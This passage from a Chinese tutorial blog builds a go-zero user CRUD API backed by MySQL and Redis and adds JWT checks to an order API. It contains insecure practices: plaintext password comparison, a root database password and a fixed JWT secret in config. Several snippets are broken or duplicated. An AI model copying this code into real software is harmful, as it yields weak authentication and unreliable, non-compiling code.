`json:&quot;id&quot;`</span><br><span class="line">		Username string `json:&quot;username&quot;`</span><br><span class="line">	&#125;</span><br><span class="line">	UserQueryReq &#123;</span><br><span class="line">		Username string `json:&quot;username&quot;`</span><br><span class="line">	&#125;</span><br><span class="line">	UserQueryRes &#123;</span><br><span class="line">		UserList []*User `json:&quot;products&quot;`</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">service user-api &#123;</span><br><span class="line">	@handler login</span><br><span class="line">	post /user/login (LoginReq) returns (LoginReply)</span><br><span class="line">	@handler UserAdd</span><br><span class="line">	post /user/UserAdd (UserAddReq) returns (UserAddRes)</span><br><span class="line">	@handler UserDel</span><br><span class="line">	post /user/UserDel (UserDelReq) returns (UserDelRes)</span><br><span class="line">	@handler UserQuery</span><br><span class="line">	get /user/UserQuery (UserQueryReq) returns (UserQueryRes)</span><br><span class="line">	@handler UserEdit</span><br><span class="line">	post /user/UserEdit (UserEditReq) returns (UserEditRes)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>生成api服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\study-gozero-demo\mall\user\api&gt; goctl api go -api user.api -dir . </span><br></pre></td></tr></table></figure>

<h3 id="编写业务代码"><a href="#编写业务代码" class="headerlink" title="编写业务代码"></a>编写业务代码</h3><ul>
<li>目录<code>E:\proj\gowork\study-gozero-demo\mall\user\api\internal\config\config.go</code>对添加mysql配置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">package config</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/core/stores/cache&quot;</span><br><span class="line">	&quot;github.com/zeromicro/go-zero/rest&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type Config struct &#123;</span><br><span class="line">	rest.RestConf</span><br><span class="line">	// 添加mysql配置</span><br><span class="line">	Mysql struct &#123;</span><br><span class="line">		DataSource string</span><br><span class="line">	&#125;</span><br><span class="line">	// 使用缓存</span><br><span class="line">	CacheRedis cache.CacheConf</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>修改<code>E\proj\gowork\study-gozero-demo\mall\user\api\etc\user-api.yaml</code>配置文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name: user-api</span><br><span class="line">Host: 0.0.0.0</span><br><span class="line">Port: 8888</span><br><span class="line">Mysql:</span><br><span class="line">  DataSource: root:123456@tcp(127.0.0.1:3306)/go_zero?charset=utf8mb4&amp;parseTime=true&amp;loc=Asia%2FShanghai</span><br><span class="line">CacheRedis:</span><br><span class="line">  - Host: 127.0.0.1:6379</span><br><span class="line">    Pass: &quot;&quot;</span><br><span class="line">    Type: node</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本地环境你需要搭建好mysql和redis的环境</p>
</blockquote>
<ul>
<li>完善依赖服务<code>user/api/internal/svc/servicecontext.go</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> svc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;study-gozero-demo/mall/user/api/internal/config&quot;</span></span><br><span class="line">	<span class="string">&quot;study-gozero-demo/mall/user/model&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/zeromicro/go-zero/core/stores/sqlx&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ServiceContext <span class="keyword">struct</span> &#123;</span><br><span class="line">	Config config.Config</span><br><span class="line">	<span class="comment">// 引入model层的增删改查</span></span><br><span class="line">	UserModel model.UserModel</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewServiceContext</span><span class="params">(c config.Config)</span></span> *ServiceContext &#123;</span><br><span class="line">	<span class="comment">// 初始化mysql连接</span></span><br><span class="line">	conn := sqlx.NewMysql(c.Mysql.DataSource)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> &amp;ServiceContext&#123;</span><br><span class="line">		Config: c,</span><br><span class="line">		<span class="comment">// 调用user/model层代码</span></span><br><span class="line">		UserModel: model.NewUserModel(conn, c.CacheRedis),</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>编写<code>user/api/internal/logic </code>目录下的各接口信息</li>
</ul>
<h4 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//loginlogic.go</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *LoginLogic)</span></span> Login(req *types.LoginReq) (resp *types.LoginReply, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// todo: add your logic here and delete this line</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(strings.TrimSpace(req.Username)) == <span class="number">0</span> || <span class="built_in">len</span>(strings.TrimSpace(req.Password)) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;参数错误&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	userInfo, err := l.svcCtx.UserModel.FindOneByUsername(l.ctx, req.Username)</span><br><span class="line">	<span class="keyword">switch</span> err &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="literal">nil</span>:</span><br><span class="line">	<span class="keyword">case</span> model.ErrNotFound:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;用户名不存在&quot;</span>)</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> userInfo.Pwd != req.Password &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;用户密码不正确&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 登录成功返回数据</span></span><br><span class="line">	<span class="keyword">return</span> &amp;types.LoginReply&#123;</span><br><span class="line">		Id:       userInfo.Id,</span><br><span class="line">		Username: userInfo.Username,</span><br><span class="line">	&#125;, <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="新增用户"><a href="#新增用户" class="headerlink" title="新增用户"></a>新增用户</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// useraddlogic.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *UserAddLogic)</span></span> UserAdd(req *types.UserAddReq) (resp *types.UserAddRes, err <span class="type">error</span>) </span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(strings.TrimSpace(req.Username)) == <span class="number">0</span> || <span class="built_in">len</span>(strings.TrimSpace(req.Password)) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;参数错误&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	userInfo, err1 := l.svcCtx.UserModel.FindOneByUsername(l.ctx, req.Username)</span><br><span class="line">	fmt.Println(<span class="string">&quot;user_info&quot;</span>, userInfo)</span><br><span class="line">	<span class="comment">// 如果查到已存在用户名，则不能新增</span></span><br><span class="line">	<span class="keyword">if</span> err1 == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(req.Username + <span class="string">&quot;用户已经存在&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 组装结构体</span></span><br><span class="line">	<span class="keyword">var</span> addReq model.User</span><br><span class="line">	errCopy := copier.Copy(&amp;addReq, req)</span><br><span class="line">	<span class="keyword">if</span> errCopy != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errCopy</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	respd, err2 := l.svcCtx.UserModel.Insert(l.ctx, &amp;addReq)</span><br><span class="line">	fmt.Println(<span class="string">&quot;------respd:&quot;</span>, respd, <span class="string">&quot;error:&quot;</span>, err2)</span><br><span class="line">	<span class="keyword">if</span> err2 != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;insert into error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(err.Error())</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 登录成功返回数据</span></span><br><span class="line">	<span class="keyword">return</span> &amp;types.UserAddRes&#123;</span><br><span class="line">		Name: req.Username,</span><br><span class="line">	&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// usereditlogic.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *UserEditLogic)</span></span> UserEdit(req *types.UserEditReq) (resp *types.UserEditRes, err <span class="type">error</span>) &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(strings.TrimSpace(req.Username)) == <span class="number">0</span> || <span class="built_in">len</span>(strings.TrimSpace(req.Password)) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;参数错误&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> strings.TrimSpace(req.Username) == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;此用户不许修改&quot;</span>)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	userInfo, _ := l.svcCtx.UserModel.FindOne(l.ctx, req.Id)</span><br><span class="line">	<span class="keyword">if</span> userInfo == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;用户不存在&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 组装结构体</span></span><br><span class="line">	<span class="keyword">var</span> editReq model.User</span><br><span class="line">	errCopy := copier.Copy(&amp;editReq, req)</span><br><span class="line">	<span class="keyword">if</span> errCopy != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errCopy</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err2 := l.svcCtx.UserModel.Update(l.ctx, &amp;editReq)</span><br><span class="line">	<span class="keyword">if</span> err2 != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;update  error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;更新错误&quot;</span>)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 返回数据</span></span><br><span class="line">	<span class="keyword">return</span> &amp;types.UserEditRes&#123;</span><br><span class="line">		Username: req.Username,</span><br><span class="line">		Id:       req.Id,</span><br><span class="line">	&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>删除</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// userdellogic.go</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *UserDelLogic)</span></span> UserDel(req *types.UserDelReq) (resp *types.UserDelRes, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// todo: add your logic here and delete this line</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> req.Id == <span class="number">23</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;此用户不可删除&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	userInfo, _ := l.svcCtx.UserModel.FindOne(l.ctx, req.Id)</span><br><span class="line">	<span class="keyword">if</span> userInfo == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;用户不存在&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err2 := l.svcCtx.UserModel.Delete(l.ctx, req.Id)</span><br><span class="line">	<span class="keyword">if</span> err2 != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;del  error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;删除错误&quot;</span>)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 返回数据</span></span><br><span class="line">	<span class="keyword">return</span> &amp;types.UserDelRes&#123;</span><br><span class="line">		Username: userInfo.Username.String,</span><br><span class="line">		Id:       userInfo.Id,</span><br><span class="line">	&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>查询</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *UserQueryLogic)</span></span> UserQuery(req *types.UserQueryReq) (resp *types.UserQueryRes, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="comment">// todo: add your logic here and delete this line</span></span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;username&quot;</span>, req.Username)</span><br><span class="line">	res1, err := l.svcCtx.UserModel.FindAll(l.ctx, req.Username)</span><br><span class="line">	fmt.Println(<span class="string">&quot;res1:&quot;</span>, res1, <span class="string">&quot;err:&quot;</span>, err)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;查询错误&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> resList []*types.User</span><br><span class="line">	<span class="keyword">for</span> _, u := <span class="keyword">range</span> res1 &#123;</span><br><span class="line">		<span class="keyword">var</span> resVo types.User</span><br><span class="line">		_ = copier.Copy(&amp;resVo, u)</span><br><span class="line">		resList = <span class="built_in">append</span>(resList, &amp;resVo)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> &amp;types.UserQueryRes&#123;UserList: resList&#125;, <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="接口测试"><a href="#接口测试" class="headerlink" title="接口测试"></a>接口测试</h3><ul>
<li>本地数据库中的user表，需要有如下密码</li>
</ul>
<p><img src="/aposts/f231d6a2/image-20230727151305396.png" alt="image-20230727151305396"></p>
<ul>
<li>启动user&#x2F;api的服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\study-gozero-demo\mall\user\api&gt; go run .\user.go</span><br></pre></td></tr></table></figure>

<ul>
<li>python客户端进行测试</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">data =&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;123456&quot;&#125;</span><br><span class="line">resp = requests.post(&quot;http://127.0.0.1:8888/user/login&quot;, json=data)</span><br><span class="line">print(resp.text)</span><br><span class="line"></span><br><span class="line">data =&#123;&quot;username&quot;: &quot;admin1&quot;, &quot;password&quot;: &quot;1234561&quot;, &quot;gender&quot;: &quot;男&quot;&#125;</span><br><span class="line">resp = requests.post(&quot;http://127.0.0.1:8888/user/UserAdd&quot;, json=data)</span><br><span class="line">print(resp.text)</span><br><span class="line"></span><br><span class="line">data =&#123;&quot;username&quot;: &quot;admin551&quot;, &quot;password&quot;: &quot;12345776&quot;, &quot;gender&quot;: &quot;男1&quot;, &quot;id&quot;: 24&#125;</span><br><span class="line">resp = requests.post(&quot;http://127.0.0.1:8888/user/UserEdit&quot;, json=data)</span><br><span class="line">print(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data =&#123;&quot;username&quot;: &quot;&quot;&#125;</span><br><span class="line">resp = requests.get(&quot;http://127.0.0.1:8888/user/UserQuery&quot;, json=data)</span><br><span class="line">print(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data =&#123;&quot;id&quot;: 23&#125;</span><br><span class="line">resp = requests.post(&quot;http://127.0.0.1:8888/user/UserDel&quot;, json=data)</span><br><span class="line">print(resp.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="业务鉴权jwt"><a href="#业务鉴权jwt" class="headerlink" title="业务鉴权jwt"></a>业务鉴权jwt</h3><ul>
<li>jwt鉴权一般在api层使用，我们这次演示工程中分别在user api登录时生成jwt token，在order api查模拟新增时验证用户jwt token。</li>
</ul>
<h4 id="user-api"><a href="#user-api" class="headerlink" title="user api"></a>user api</h4><ul>
<li>配置<code>mall/user/api/internal/config/config.go</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/zeromicro/go-zero/core/stores/cache&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/zeromicro/go-zero/rest&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Config <span class="keyword">struct</span> &#123;</span><br><span class="line">	rest.RestConf</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 添加mysql配置</span></span><br><span class="line">	Mysql <span class="keyword">struct</span> &#123;</span><br><span class="line">		DataSource <span class="type">string</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 使用缓存</span></span><br><span class="line">	CacheRedis cache.CacheConf</span><br><span class="line">	<span class="comment">// jwt的配置字段</span></span><br><span class="line">	Auth <span class="keyword">struct</span> &#123;</span><br><span class="line">        AccessSecret <span class="type">string</span></span><br><span class="line">        AccessExpire <span class="type">int64</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>配置<code>/order/api/etc/api.yaml</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name: user-api</span><br><span class="line">Host: 0.0.0.0</span><br><span class="line">Port: 8888</span><br><span class="line">Mysql:</span><br><span class="line">  DataSource: root:123456@tcp(127.0.0.1:3306)/go_zero?charset=utf8mb4&amp;parseTime=true&amp;loc=Asia%2FShanghai</span><br><span class="line">CacheRedis:</span><br><span class="line">  - Host: 127.0.0.1:6379</span><br><span class="line">    Pass: &quot;&quot;</span><br><span class="line">    Type: node</span><br><span class="line">Auth:</span><br><span class="line">  # 生成jwt token的密钥 一般格式为udid</span><br><span class="line">  AccessSecret: 0c891c78-9415-ec96-deb8-3b658f9e57f3</span><br><span class="line">  # jwt token有效期，单位：秒,现在设置的为1小时</span><br><span class="line">  AccessExpire: 3600</span><br></pre></td></tr></table></figure>

<ul>
<li>在user&#x2F;api&#x2F;internal&#x2F;logic&#x2F;loginlogic.go 中加上生成jwt内容的代码，并且在登录返回的数据返回jwt内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (l *LoginLogic) getJwtToken(secretKey string, iat, seconds, userId int64) (string, error) &#123;</span><br><span class="line">	claims := make(jwt.MapClaims)</span><br><span class="line">	claims[&quot;exp&quot;] = iat + seconds</span><br><span class="line">	claims[&quot;iat&quot;] = iat</span><br><span class="line">	claims[&quot;userId&quot;] = userId</span><br><span class="line">	token := jwt.New(jwt.SigningMethodHS256)</span><br><span class="line">	token.Claims = claims</span><br><span class="line">	return token.SignedString([]byte(secretKey))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (l *LoginLogic) Login(req *types.LoginReq) (resp *types.LoginReply, err error) &#123;</span><br><span class="line">	if len(strings.TrimSpace(req.Username)) == 0 || len(strings.TrimSpace(req.Password)) == 0 &#123;</span><br><span class="line">		return nil, errors.New(&quot;参数错误&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">	userInfo, err := l.svcCtx.UserModel.FindOneByUsername(l.ctx, req.Username)</span><br><span class="line">	switch err &#123;</span><br><span class="line">	case nil:</span><br><span class="line">	case model.ErrNotFound:</span><br><span class="line">		return nil, errors.New(&quot;用户名不存在&quot;)</span><br><span class="line">	default:</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	if userInfo.Password.String != req.Password &#123;</span><br><span class="line">		return nil, errors.New(&quot;用户密码不正确&quot;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// ---jwt-start---</span><br><span class="line">	now := time.Now().Unix()</span><br><span class="line">	accessExpire := l.svcCtx.Config.Auth.AccessExpire</span><br><span class="line">	jwtToken, err := l.getJwtToken(l.svcCtx.Config.Auth.AccessSecret, now, l.svcCtx.Config.Auth.AccessExpire, userInfo.Id)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	// ---jwt-end---</span><br><span class="line"></span><br><span class="line">	// 登录成功返回数据</span><br><span class="line">	return &amp;types.LoginReply&#123;</span><br><span class="line">		Id:           userInfo.Id,</span><br><span class="line">		Username:     userInfo.Username.String,</span><br><span class="line">		AccessToken:  jwtToken,</span><br><span class="line">		AccessExpire: now + accessExpire,</span><br><span class="line">		RefreshAfter: now + accessExpire/2,</span><br><span class="line">	&#125;, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="order-api"><a href="#order-api" class="headerlink" title="order api"></a>order api</h4><ul>
<li><p>使用jwt鉴权校验</p>
</li>
<li><p>我们把之前的<code>order/api</code>目录内容清空</p>
</li>
<li><p>编写<code>mall/order/api/order.api</code></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type (</span><br><span class="line">	OrderReq &#123;</span><br><span class="line">		Id string `path:&quot;id&quot;`</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	OrderReply &#123;</span><br><span class="line">		Id          string `json:&quot;id&quot;`</span><br><span class="line">		ProductName string `json:&quot;productname&quot;`</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	OrderAddReq &#123;</span><br><span class="line">		ProductName string `json:&quot;productname&quot;`</span><br><span class="line">		Price       string `json:&quot;price&quot;`</span><br><span class="line">		Unit        string `json:&quot;unit&quot;`</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	OrderAddRes &#123;</span><br><span class="line">		Code     int    `json:&quot;code&quot;`</span><br><span class="line">		Messsage string `json:&quot;message&quot;`</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">// 在哪个服务头上加这个验证，就是需要jwt鉴权</span><br><span class="line">@server(</span><br><span class="line">	jwt: Auth</span><br><span class="line">)</span><br><span class="line">service order &#123;</span><br><span class="line">	@handler orderAdd</span><br><span class="line">	post /api/order/OrderAdd (OrderAddReq) returns (OrderAddRes)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">service order &#123;</span><br><span class="line">	@handler getOrder</span><br><span class="line">	get /api/order/get/:id (OrderReq) returns (OrderReply)</span><br><span class="line">&#125;</span><br><span class="line">// 在哪个服务头上加这个验证，就是需要jwt鉴权</span><br><span class="line">@server(</span><br><span class="line">	jwt: Auth</span><br><span class="line">)</span><br><span class="line">service order &#123;</span><br><span class="line">	@handler orderAdd</span><br><span class="line">	post /api/order/OrderAdd (OrderAddReq) returns (OrderAddRes)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">service order &#123;</span><br><span class="line">	@handler getOrder</span><br><span class="line">	get /api/order/get/:id (OrderReq) returns (OrderReply)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>生成order.api代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\study-gozero-demo\mall\order\api&gt;  goctl api go -api order.api -dir . </span><br></pre></td></tr></table></figure>

<ul>
<li>分别编写<code>mall\order\api\internal\logic</code> 下的测试代码</li>
</ul>
<p><code>getorderlogic.go</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (l *GetOrderLogic) GetOrder(req *types.OrderReq) (resp *types.OrderReply, err error) &#123;</span><br><span class="line">	fmt.Println(&quot;id=&quot;, req.Id)</span><br><span class="line"></span><br><span class="line">	return &amp;types.OrderReply&#123;</span><br><span class="line">		Id:          req.Id,</span><br><span class="line">		ProductName: &quot;test order&quot;,</span><br><span class="line">	&#125;, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>orderaddlogic.go</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (l *OrderAddLogic) OrderAdd(req *types.OrderAddReq) (resp *types.OrderAddRes, err error) &#123;</span><br><span class="line">	fmt.Println(&quot;req=&quot;, req)</span><br><span class="line">	return &amp;types.OrderAddRes&#123;</span><br><span class="line">		Code:     1,</span><br><span class="line">		Messsage: &quot;success&quot;,</span><br><span class="line">	&#125;, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>order/api/etc/order.yaml </code>端口修改和加上jwt的token</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name: order</span><br><span class="line">Host: 0.0.0.0</span><br><span class="line">Port: 8889</span><br><span class="line">Auth:</span><br><span class="line">  # 生成jwt token的密钥 一般格式为udid</span><br><span class="line">  AccessSecret: 0c891c78-9415-ec96-deb8-3b658f9e57f3</span><br><span class="line">  # jwt token有效期，单位：秒,现在设置的为1小时</span><br><span class="line">  AccessExpire: 3600</span><br></pre></td></tr></table></figure>

<ul>
<li>分别启动<code>order/api/order.go</code> 和<code>user/api/user.go</code></li>
</ul>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resp = requests.get(&quot;http://127.0.0.1:8889/api/order/get/2&quot;)</span><br><span class="line">print(resp.text)</span><br><span class="line"></span><br><span class="line">data =&#123;&quot;productname&quot;: &quot;西瓜&quot;, &quot;price&quot;: &quot;122&quot;, &quot;unit&quot;: &quot;个&quot;&#125;</span><br><span class="line">resp = requests.post(&quot;http://127.0.0.1:8889/api/order/OrderAdd&quot;, json=data)</span><br><span class="line">print(resp)</span><br><span class="line"></span><br><span class="line">&#123;&quot;id&quot;:&quot;2&quot;,&quot;productname&quot;:&quot;test order&quot;&#125;</span><br><span class="line">&lt;Response [401]&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>发现OrderAdd 直接返回401</p>
</li>
<li><p>我们把token加到头部</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data =&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;123456&quot;&#125;</span><br><span class="line">resp = requests.post(&quot;http://127.0.0.1:8888/user/login&quot;, json=data)</span><br><span class="line">data = json.loads(resp.text)</span><br><span class="line">token = data[&quot;accessToken&quot;]</span><br><span class="line">resp = requests.post(&quot;http://127.0.0.1:8889/api/order/OrderAdd&quot;, headers=header, json=data1)</span><br><span class="line">print(resp.text)</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;:1,&quot;message&quot;:&quot;success&quot;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>本次主要用单机服务实现了user api层结合mysql的增删改查，同时在order层加上了jwt的校验</li>
<li>由于登录的数据缓存到了redis中，进行修改和删除时，可能出现删除不掉，因此可以在redis中删除可以</li>
<li>下篇文章将使用为微服务,mysql,jwt等结合起来</li>
</ul>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>go-zero</tag>
      </tags>
  </entry>
  <entry>
    <title>go-zero实战系列一</title>
    <url>/aposts/4d2d858d/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本次主要按照这个博主的<a href="https://www.cnblogs.com/kevinwan/tag/go-zero/">go-zero微服务实战</a>进行学习</p>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><ul>
<li>安装依赖go-zero: <code>go get -u github.com/zeromicro/go-zero@latest</code></li>
<li>安装依赖goctl，用命令进行安装：<code>go install github.com/zeromicro/go-zero/tools/goctl@latest</code><ul>
<li><a href="https://www.cnblogs.com/kevinwan/p/16325802.html">微服务效率工具 goctl 深度解析</a></li>
</ul>
</li>
<li>安装成功后，输入<code>go env</code> 找到<code>GOPATH</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\gowork\studyGoZero&gt;go env</span><br><span class="line">set GO111MODULE=on</span><br><span class="line">set GOPATH=C:\Users\Administrator\go</span><br><span class="line">set GOROOT=E:\app\Go</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<ul>
